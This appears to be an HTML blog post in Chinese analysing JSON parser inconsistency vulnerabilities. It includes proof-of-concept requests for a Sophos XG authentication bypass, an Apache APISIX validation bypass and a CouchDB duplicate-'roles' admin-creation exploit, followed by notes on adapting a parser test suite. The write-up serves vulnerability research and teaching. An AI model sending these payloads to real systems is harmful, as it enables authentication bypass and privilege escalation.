@@ -1,0 +1,654 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Hexo Theme Keep">
+    <meta name="description" content="Hexo Theme Keep">
+    <meta name="author" content="p0melo">
+    
+    <title>
+        
+            JSON解析不一致性漏洞探究 |
+        
+        p0melo&#39;s blog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <link rel="shortcut icon" href="/images/p0melo.svg">
+    
+<link rel="stylesheet" href="/fontawesome/css/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/css/regular.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/css/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/css/brands.min.css">
+
+    <script id="hexo-configurations">
+    let KEEP = window.KEEP || {};
+    KEEP.hexo_config = {"hostname":"example.com","root":"/","language":"en","path":"search.xml"};
+    KEEP.theme_config = {"toc":{"enable":true,"number":false,"expand_all":false,"init_open":false},"style":{"primary_color":"#0066cc","logo":null,"favicon":"/images/p0melo.svg","avatar":"/images/p0melo.svg","font_size":null,"font_family":null,"hover":{"shadow":false,"scale":false},"first_screen":{"enable":true,"header_transparent":true,"background_img":"/images/bg.svg","description":"心之所向，素履以往，生如逆旅，一苇以航。","font_color":null,"hitokoto":false},"scroll":{"progress_bar":false,"percent":false}},"local_search":{"enable":true,"preload":true},"code_copy":{},"code_block":{"tools":{"enable":true,"style":"default"},"highlight_theme":"default"},"side_tools":{},"pjax":{"enable":false},"lazyload":{"enable":false},"comment":{"enable":true,"use":"valine","valine":{"appid":"E3140V5fTteP8KzwJweuefl2-gzGzoHsz","appkey":"Wo0PLY3dWpTTzUDW3Hbj6Gud","placeholder":null},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.7"},"waline":{"server_url":null,"reaction":false,"version":2}},"post":{"author_label":{"enable":false,"auto":false,"custom_label_list":["Trainee","Engineer","Architect"]},"word_count":{"enable":true,"wordcount":true,"min2read":true},"img_align":"left","copyright_info":true},"version":"3.5.2"};
+    KEEP.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    KEEP.language_code_block = {"copy":"Copy code","copied":"Copied","fold":"Fold code block","folded":"Folded"};
+  </script>
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+
+    
+</div>
+
+
+<main class="page-container">
+
+    
+
+    <div class="page-main-content">
+
+        <div class="page-main-content-top">
+            
+<header class="header-wrapper">
+
+    <div class="header-content">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+               p0melo&#39;s blog
+            </a>
+        </div>
+
+        <div class="right">
+            <div class="pc">
+                <ul class="menu-list">
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/"
+                            >
+                                HOME
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/archives"
+                            >
+                                ARCHIVES
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/tags"
+                            >
+                                TAGS
+                            </a>
+                        </li>
+                    
+                    
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="fas fa-search"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list">
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/">HOME</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/archives">ARCHIVES</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/tags">TAGS</a>
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle">
+
+            <div class="main-content">
+
+                
+                    <div class="fade-in-down-animation">
+    <div class="post-page-container">
+        <div class="article-content-container">
+
+            <div class="article-title">
+                <span class="title-hover-animation">JSON解析不一致性漏洞探究</span>
+            </div>
+
+            
+                <div class="article-header">
+                    <div class="avatar">
+                        <img src="/images/p0melo.svg">
+                    </div>
+                    <div class="info">
+                        <div class="author">
+                            <span class="name">p0melo</span>
+                            
+                        </div>
+                        <div class="meta-info">
+                            
+<div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        
+            <i class="fa-regular fa-calendar-plus"></i>&nbsp;
+        
+        <span class="pc">2024-05-07 11:46:59</span>
+        <span class="mobile">2024-05-07 11:46</span>
+    </span>
+    
+        <span class="article-update-date article-meta-item">
+        <i class="fas fa-file-pen"></i>&nbsp;
+        <span class="pc">2024-05-07 12:04:54</span>
+    </span>
+    
+    
+    
+
+    
+    
+    
+    
+</div>
+
+                        </div>
+                    </div>
+                </div>
+            
+
+            <div class="article-content keep-markdown-body">
+                <h1 id="json解析器差异导致的安全问题"><a href="#json解析器差异导致的安全问题" class="headerlink" title="json解析器差异导致的安全问题"></a>json解析器差异导致的安全问题</h1><blockquote>
+<p>前段时间在准备技术分享内容，看到JSON Interoperability类型的漏洞，感觉还挺有意思，整理一些案例和工具分享下</p>
+</blockquote>
+<h1 id="1-背景"><a href="#1-背景" class="headerlink" title="1.背景"></a>1.背景</h1><p>JSON（JavaScript Object Notation）是一种轻量级的数据交换格式，易于人阅读和编写，同时也易 于机器解析和生成。它基于JavaScript语言标准ECMA-262第3版（1999年12月）的一个子集。随着时间的推移，JSON已经超越了JavaScript，成为许多编程语言支持的标准数据格式之一。</p>
+<p> 如HTTP 请求走私等攻击一样，<strong>json解析器之间以及多阶段请求处理的差异可能引入严重的漏洞</strong>，即使是在严格遵守规范的解析器，也不可避免的与规范存在偏差，这是为什么？</p>
+<p>1.<strong>关于JSON的规范有多个，各规范定义有一定的差异</strong></p>
+<ul>
+<li><a class="link"   target="_blank" rel="noopener" href="https://262.ecma-international.org/" >ECMAScript Standard<i class="fas fa-external-link-alt"></i></a>：ECMAScript是JavaScript语言的标准化名称，定义了JSON作为JavaScript的一个子集，但实际应用超出了JavaScript</li>
+<li><a class="link"   target="_blank" rel="noopener" href="https://datatracker.ietf.org/doc/html/rfc8259" >IETF JSON RFC 8259<i class="fas fa-external-link-alt"></i></a>：提供了一个严格和精确的JSON数据交换格式规范，这个标准旨在确保JSON数据的交换在不同的系统间能够保持一致性和可靠性</li>
+<li>……</li>
+</ul>
+<p>2.<strong>规范文档对于一些定义是开放式的描述</strong>，例如 IETF JSON RFC 8259 对重复键的描述</p>
+<blockquote>
+<p><em>An object whose names are all unique is interoperable in the sense that all software implementations receiving that object will agree on the name-value mappings. When the names within an object are not unique, the behavior of software that receives such an object is unpredictable. Many implementations report the last name&#x2F;value pair only. Other implementations report an error or fail to parse the object, and some implementations report all of the name&#x2F;value pairs, including duplicates.</em></p>
+</blockquote>
+<p>只是说明了各种解析器对重复键值处理的各种现象，并没有规定当重复键出现时应怎么处理。</p>
+<p><strong>那么主要有哪些JSON解析差异可能会导致漏洞？</strong></p>
+<ul>
+<li>重复键的优先级差异。</li>
+<li>特殊键解析差异：字符截断和注释</li>
+<li>JSON序列化结构差异</li>
+<li>浮点数和整数表示差异</li>
+<li>解析容错机制和其他bug</li>
+<li>……</li>
+</ul>
+<p>更多的差异分类和细节可参考<a class="link"   target="_blank" rel="noopener" href="https://bishopfox.com/blog/json-interoperability-vulnerabilities" >https://bishopfox.com/blog/json-interoperability-vulnerabilities<i class="fas fa-external-link-alt"></i></a>，下面我们看一些真实的cve漏洞案例。</p>
+<h1 id="2-漏洞案例"><a href="#2-漏洞案例" class="headerlink" title="2.漏洞案例"></a>2.漏洞案例</h1><h2 id="案例1：Sophos-XG认证绕过-CVE-2022-1040"><a href="#案例1：Sophos-XG认证绕过-CVE-2022-1040" class="headerlink" title="案例1：Sophos XG认证绕过 CVE-2022-1040"></a>案例1：Sophos XG认证绕过 CVE-2022-1040</h2><p><strong>数据流</strong></p>
+<p>Sophos XG Firewall各组件调用关系可以简化如下</p>
+<img src="/2024/05/07/JSON%E8%A7%A3%E6%9E%90%E4%B8%8D%E4%B8%80%E8%87%B4%E6%80%A7%E6%BC%8F%E6%B4%9E%E6%8E%A2%E7%A9%B6/Untitled-1715053743878-1.png" class="" title="Untitled">
+
+<p>apache接受用户的http请求后转发给jetty处理过滤后，通过类似于 HTTP 的 TCP 和 UDP 协议转发给csc服务，csc处理系统的核心业务，它的核心部分是用C语言编写的，逻辑部分是通过Perl C语言接口（Perl C Language Interface）用Perl语言编写的。</p>
+<p><strong>核心方法分析</strong></p>
+<p>具体的漏洞细节分析这里不做过多描述，参考 <a class="link"   target="_blank" rel="noopener" href="https://blog.viettelcybersecurity.com/cve-2022-1040-sophos-xg-firewall-authentication-bypass/" >https://blog.viettelcybersecurity.com/cve-2022-1040-sophos-xg-firewall-authentication-bypass/<i class="fas fa-external-link-alt"></i></a></p>
+<p>我们这里只分析下关键的绕过逻辑，看下登录绕过的poc数据包</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /webconsole/Controller HTTP/<span class="number">1.1</span></span><br><span class="line"><span class="comment">// Other request header</span></span><br><span class="line"></span><br><span class="line">mode=<span class="number">151</span>&amp;json=&#123;<span class="string">&quot;username&quot;</span>:<span class="string">&quot;admin&quot;</span>,<span class="string">&quot;password&quot;</span>:<span class="string">&quot;somethingnotpassword&quot;</span>,<span class="string">&quot;languageid&quot;</span>:<span class="string">&quot;1&quot;</span>,<span class="string">&quot;browser&quot;</span>:<span class="string">&quot;Chrome_123&quot;</span>,<span class="string">&quot;accessaction&quot;</span>:<span class="number">1</span>,<span class="string">&quot;mode\u0000p0melo&quot;</span>:<span class="number">716</span>&#125;&amp;__RequestType=ajax&amp;t=<span class="number">1712025156789</span></span><br></pre></td></tr></table></figure>
+
+<p>主要起作用的是<code>mode</code>和<code>json</code>两个参数，jetty侧会通过<code>org.json-20090211</code>这个库解析json参数传的json数据，通过<code>cscClient.generateAndSendAjaxEvent</code>发送到CSC做认证，发送前会将<code>mode</code>参数<code>put</code>到解析后的json中，如果这里返回的状态码是200或者201，则认为是登录认证通过</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">WebAdminAuth</span> &#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">process</span><span class="params">(<span class="keyword">final</span> HttpServletRequest request, <span class="keyword">final</span> HttpServletResponse response, <span class="keyword">final</span> EventBean eventBean, <span class="keyword">final</span> SqlReader sqlReader)</span> &#123;</span><br><span class="line">    <span class="keyword">final</span> <span class="type">JSONObject</span> <span class="variable">jsonObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONObject</span>(request.getParameter(<span class="string">&quot;json&quot;</span>));</span><br><span class="line">    <span class="keyword">final</span> <span class="type">int</span> <span class="variable">languageId</span> <span class="operator">=</span> jsonObject.getInt(<span class="string">&quot;languageid&quot;</span>);</span><br><span class="line">    <span class="keyword">final</span> <span class="type">int</span> <span class="variable">returnedStatus</span> <span class="operator">=</span> cscClient.generateAndSendAjaxEvent(request, response, eventBean, sqlReader);</span><br><span class="line">    <span class="keyword">if</span> (returnedStatus != <span class="number">200</span> &amp;&amp; returnedStatus != <span class="number">201</span>) &#123;</span><br><span class="line">	    <span class="comment">//...</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="type">String</span> <span class="variable">uname</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">      <span class="keyword">if</span> (jsonObject.has(<span class="string">&quot;username&quot;</span>)) &#123;</span><br><span class="line">        uname = jsonObject.getString(<span class="string">&quot;username&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      </span><br><span class="line">      <span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">final</span> <span class="type">SessionBean</span> <span class="variable">sessionBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SessionBean</span>();</span><br><span class="line">      sessionBean.setUserName(uname);</span><br><span class="line">      <span class="comment">// ...</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>jetty侧的<code>org.json-20090211</code>这个库对于重复键会抛出异常</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.json.JSONObject;</span><br><span class="line"><span class="keyword">import</span> org.json.JSONObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> JSONException &#123;</span><br><span class="line">	<span class="type">JSONObject</span> <span class="variable">json</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONObject</span>(<span class="string">&quot;&#123; \&quot;name\&quot;: \&quot;test\&quot;, \&quot;name\&quot;: \&quot;test2\&quot;&#125;&quot;</span>);</span><br><span class="line">	System.out.println(json);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Exception in thread <span class="string">&quot;main&quot;</span> org.json.JSONException: Duplicate key <span class="string">&quot;name&quot;</span></span><br><span class="line">	at org.json.JSONObject.putOnce(JSONObject.java:<span class="number">1094</span>)</span><br><span class="line">	at org.json.JSONObject.&lt;init&gt;(JSONObject.java:<span class="number">206</span>)</span><br><span class="line">	at org.json.JSONObject.&lt;init&gt;(JSONObject.java:<span class="number">420</span>)</span><br></pre></td></tr></table></figure>
+
+<p>csc使用的<code>json-c</code>这个库来解析输入的数据，对于重复键，则取后面一个</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$ cat test.c</span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;json-c/json.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *s;</span><br><span class="line">  json_object *json;</span><br><span class="line">  s = <span class="string">&quot;&#123; \&quot;key\&quot; : \&quot;val1\&quot;,\&quot;key\&quot;:\&quot;val2\&quot;&#125;&quot;</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;string = %s\n&quot;</span>, s);</span><br><span class="line">  json = json_tokener_parse(s);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;json = %s\n&quot;</span>, json_object_to_json_string_ext(json, JSON_C_TO_STRING_PRETTY));</span><br><span class="line">  json_object_put(json);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ gcc test.c -o <span class="built_in">test</span> -ljson-c</span><br><span class="line">$ ./test </span><br><span class="line">string = &#123; <span class="string">&quot;key&quot;</span> : <span class="string">&quot;val1&quot;</span>,<span class="string">&quot;key&quot;</span>:<span class="string">&quot;val2&quot;</span>&#125;</span><br><span class="line">json = &#123;</span><br><span class="line">  <span class="string">&quot;key&quot;</span>:<span class="string">&quot;val2&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>并且当json的key中出现unicode空字符时，<code>json-c</code>对空字符会做截断，但<code>org.json-json</code>库会保留</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$ cat test.c </span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;json-c/json.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *s;</span><br><span class="line">  json_object *json;</span><br><span class="line">  s = <span class="string">&quot;&#123; \&quot;key\&quot; : \&quot;val1\&quot;,\&quot;key\\u0000p0melo\&quot;:\&quot;val2\&quot;&#125;&quot;</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;string = %s\n&quot;</span>, s);</span><br><span class="line">  json = json_tokener_parse(s);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;json = %s\n&quot;</span>, json_object_to_json_string_ext(json, JSON_C_TO_STRING_PRETTY));</span><br><span class="line">  json_object_put(json);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ gcc test.c -o <span class="built_in">test</span> -ljson-c</span><br><span class="line">$ ./test </span><br><span class="line">string = &#123; <span class="string">&quot;key&quot;</span> : <span class="string">&quot;val1&quot;</span>,<span class="string">&quot;key\u0000p0melo&quot;</span>:<span class="string">&quot;val2&quot;</span>&#125;</span><br><span class="line">json = &#123;</span><br><span class="line">  <span class="string">&quot;key&quot;</span>:<span class="string">&quot;val2&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">// 被截断后识别为2个key的重复键，取后面一个，就是val2</span><br></pre></td></tr></table></figure>
+
+<p>这个漏洞就是利用了这两个库的解析差异特性导致的绕过，我们使用下面命令开启debug，查看poc请求时的参数变化</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">csc custom debug</span><br><span class="line">tail -f /<span class="built_in">log</span>/csc.<span class="built_in">log</span></span><br></pre></td></tr></table></figure>
+
+<p>发送请poc请求，从日志可以看到，经过jetty侧<code>org.json-json</code>库解析转发到csc时，同时包含了<code>mode</code>和<code>mode\u0000p0melo</code>两个键</p>
+<img src="/2024/05/07/JSON%E8%A7%A3%E6%9E%90%E4%B8%8D%E4%B8%80%E8%87%B4%E6%80%A7%E6%BC%8F%E6%B4%9E%E6%8E%A2%E7%A9%B6/Untitled%201-1715053743879-2.png" class="" title="Untitled">
+
+<p>但是通过csc的<code>createJson</code>和<code>validateJson</code>方法解析后，只有原本的json数据只有一个<code>mode</code>键了，并且值为后一个键<code>716</code>，导致csc认为是请求的<code>716</code>模块，并且请求参数合法，导致返回了200状态码和其他符合jetty侧登录判断的数据，这就导致了登录绕过</p>
+<img src="/2024/05/07/JSON%E8%A7%A3%E6%9E%90%E4%B8%8D%E4%B8%80%E8%87%B4%E6%80%A7%E6%BC%8F%E6%B4%9E%E6%8E%A2%E7%A9%B6/Untitled%202-1715053743879-4.png" class="" title="Untitled">
+
+<h2 id="案例2：Apache-APISIX-CVE-2022-25757"><a href="#案例2：Apache-APISIX-CVE-2022-25757" class="headerlink" title="案例2：Apache APISIX CVE-2022-25757"></a>案例2：<strong>Apache APISIX</strong> CVE-2022-25757</h2><p>Apache Apisix使用了request-validation插件，它可以用来检查HTTP请求头和BODY内容，<code>request-validation.lua</code>中使用<code>cjson.safe</code>库解析字符串为json对象</p>
+<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">local</span> _M = &#123;</span><br><span class="line">    version = <span class="number">0.1</span>,</span><br><span class="line">    decode = <span class="built_in">require</span>(<span class="string">&quot;cjson.safe&quot;</span>).decode,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>对于重复键，<code>cjson.safe</code>优先取后面的键值去验证，而上游应用程序的 JSON 库选择第一个出现的值，例如 <code>jsoniter</code> 或 <code>gojay 3</code>，所以发送类似下面的json数据就能绕过数据校验，将非法数据请求到上游服务</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">POST http://127.0.0.1:9080/10</span><br><span class="line">...</span><br><span class="line">&#123;<span class="string">&quot;string_payload&quot;</span>:<span class="string">&quot;bad&quot;</span>,<span class="string">&quot;string_payload&quot;</span>:<span class="string">&quot;good&quot;</span>&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这是一个典型的由于重复键优先级不一致导致的问题。</p>
+<h2 id="案例3-CouchDB-权限提升-CVE-2017-12635"><a href="#案例3-CouchDB-权限提升-CVE-2017-12635" class="headerlink" title="案例3: CouchDB 权限提升 CVE-2017-12635"></a>案例3: <strong>CouchDB 权限提升</strong> CVE-2017-12635</h2><p>CouchDB是一个NoSQL数据库，有点像 JSON blob的大型键值存储，具有数据验证、查询和用户身份验证功能。CouchDB通过<code>/_users</code>接口来管理用户账户，通过 <code>PUT</code>请求到 <code>/_users/org.couchdb.user:your_username</code>来创建或修改账户，服务器会使用 Javascript的<code>validate_doc_update</code> 函数检查，确保用户不会尝试让自己成为管理员。</p>
+<p>漏洞就出在Javascript JSON 解析器（在验证脚本中使用）与 CouchDB 内部使用的名为 jiffy 的解析器（Erlang语言）之间存在差异。看下这两个解析器对相同键的处理</p>
+<p>Erlang</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; jiffy:decode(<span class="string">&quot;&#123;\&quot;foo\&quot;:\&quot;bar\&quot;, \&quot;foo\&quot;:\&quot;baz\&quot;&#125;&quot;</span>). </span><br><span class="line">&#123;[&#123;&lt;&lt;<span class="string">&quot;foo&quot;</span>&gt;&gt;,&lt;&lt;<span class="string">&quot;bar&quot;</span>&gt;&gt;&#125;,&#123;&lt;&lt;<span class="string">&quot;foo&quot;</span>&gt;&gt;,&lt;&lt;<span class="string">&quot;baz&quot;</span>&gt;&gt;&#125;]&#125;</span><br></pre></td></tr></table></figure>
+
+<p>Javascript</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; JSON.parse(<span class="string">&quot;&#123;\&quot;foo\&quot;:\&quot;bar\&quot;, \&quot;foo\&quot;: \&quot;baz\&quot;&#125;&quot;</span>)</span><br><span class="line">&#123;foo: <span class="string">&quot;baz&quot;</span>&#125;</span><br></pre></td></tr></table></figure>
+
+<p>jiffy保留了2个重复键，用于验证的javascript取后面一个键值，并且CouchDB 数据内部表示的 getter 函数只会返回第一个值</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">% Within couch_util:get_value </span><br><span class="line">lists:keysearch(Key, 1, List).</span><br></pre></td></tr></table></figure>
+
+<p>所以我们可以通过下面的请求，让javascript解析是空，认为是非管理员用户，通过验证，而jiffy则新增的是管理员用户，从而越权新增一个admin权限用户</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">curl -X PUT <span class="string">&#x27;http://localhost:5984/_users/org.couchdb.user:oops&#x27;</span></span><br><span class="line">--data-binary <span class="string">&#x27;&#123;</span></span><br><span class="line"><span class="string">  &quot;type&quot;: &quot;user&quot;,</span></span><br><span class="line"><span class="string">  &quot;name&quot;: &quot;oops&quot;,</span></span><br><span class="line"><span class="string">  &quot;roles&quot;: [&quot;_admin&quot;],</span></span><br><span class="line"><span class="string">  &quot;roles&quot;: [],</span></span><br><span class="line"><span class="string">  &quot;password&quot;: &quot;password&quot;</span></span><br><span class="line"><span class="string">&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="3-如何批量检测json解析器的差异性？"><a href="#3-如何批量检测json解析器的差异性？" class="headerlink" title="3.如何批量检测json解析器的差异性？"></a>3.如何批量检测json解析器的差异性？</h1><p>当我们漏洞挖掘的项目有多个json解析器的情况下，可以对<a class="link"   target="_blank" rel="noopener" href="https://github.com/nst/JSONTestSuite/tree/master" >https://github.com/nst/JSONTestSuite/tree/master<i class="fas fa-external-link-alt"></i></a>这个工具稍作修改，就可以快速验证两个或多个解析器存在的差异。</p>
+<h2 id="3-1工具简介"><a href="#3-1工具简介" class="headerlink" title="3.1工具简介"></a>3.1工具简介</h2><p>如下图，<code>run_test.py</code>是主要的代码逻辑入口，<code>parsers</code>目录下是各种解析器，<code>tests</code>目录下是针对<code>RFC 8259</code>做了各种变形的json，<code>test_transform</code>目录是各种解析器识别容易有差异性json数据（超大数字、重复键、空字符等）。</p>
+<img src="/2024/05/07/JSON%E8%A7%A3%E6%9E%90%E4%B8%8D%E4%B8%80%E8%87%B4%E6%80%A7%E6%BC%8F%E6%B4%9E%E6%8E%A2%E7%A9%B6/Untitled%203-1715053743879-3.png" class="" title="Untitled">
+
+<p><code>run_test.py</code>会对<code>parsers</code>目录下各种解析器做一个包装，将解析器执行的命令返回状态结果记录到<code>log.txt</code>，然后做解析美化记录到<code>results</code>目录下，下面是生成的<code>parsing.html</code>中的对比图表，包含各种解析器对不同json数据解析后返回的状态</p>
+<img src="/2024/05/07/JSON%E8%A7%A3%E6%9E%90%E4%B8%8D%E4%B8%80%E8%87%B4%E6%80%A7%E6%BC%8F%E6%B4%9E%E6%8E%A2%E7%A9%B6/Untitled%204-1715053743879-5.png" class="" title="Untitled">
+
+<p>工具是针对<code>RFC 8259</code>标准对各json析器做的测试用例，对比的是命令执行返回状态的差异，也就是判断解析是否符合预期的成功、异常或失败。下面是<code>run_test.py</code>执行结果的判断</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> result == <span class="string">&quot;CRASH&quot;</span>:</span><br><span class="line">        s = <span class="string">&quot;%s\tCRASH\t%s&quot;</span> % (prog_name, filename)</span><br><span class="line">    <span class="keyword">elif</span> filename.startswith(<span class="string">&quot;y_&quot;</span>) <span class="keyword">and</span> result != <span class="string">&quot;PASS&quot;</span>:</span><br><span class="line">        s = <span class="string">&quot;%s\tSHOULD_HAVE_PASSED\t%s&quot;</span> % (prog_name, filename)</span><br><span class="line">    <span class="keyword">elif</span> filename.startswith(<span class="string">&quot;n_&quot;</span>) <span class="keyword">and</span> result == <span class="string">&quot;PASS&quot;</span>:</span><br><span class="line">        s = <span class="string">&quot;%s\tSHOULD_HAVE_FAILED\t%s&quot;</span> % (prog_name, filename)</span><br><span class="line">    <span class="keyword">elif</span> filename.startswith(<span class="string">&quot;i_&quot;</span>) <span class="keyword">and</span> result == <span class="string">&quot;PASS&quot;</span>:</span><br><span class="line">        s = <span class="string">&quot;%s\tIMPLEMENTATION_PASS\t%s&quot;</span> % (prog_name, filename)</span><br><span class="line">    <span class="keyword">elif</span> filename.startswith(<span class="string">&quot;i_&quot;</span>) <span class="keyword">and</span> result != <span class="string">&quot;PASS&quot;</span>:</span><br><span class="line">        s = <span class="string">&quot;%s\tIMPLEMENTATION_FAIL\t%s&quot;</span> % (prog_name, filename)</span><br></pre></td></tr></table></figure>
+
